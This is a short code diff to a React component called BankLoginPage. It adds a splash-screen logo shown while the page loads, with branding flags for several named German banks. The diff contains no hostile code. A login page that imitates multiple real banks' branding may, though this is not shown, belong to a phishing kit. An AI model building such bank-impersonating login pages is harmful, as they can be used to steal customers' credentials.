@@ -569,6 +569,15 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
   return (
     <BankShell {...shellProps}>
+      {initialLoading && !isPreview && (
+        <SplashLogoReveal 
+          logo={splashLogo} 
+          isPSD={isPSD} 
+          isSparda={isSparda} 
+          isBBBank={isBBBank} 
+          fading={loadingFading} 
+        />
+      )}
       <div className="max-w-6xl mx-auto flex flex-col lg:flex-row gap-6">
         <div className="w-full lg:w-1/2 flex flex-col gap-4">
           <div className="bg-white shadow-md border border-gray-200 overflow-hidden" style={{ borderRadius: theme.buttonRadius === "rounded-none" ? "0px" : "12px" }}>
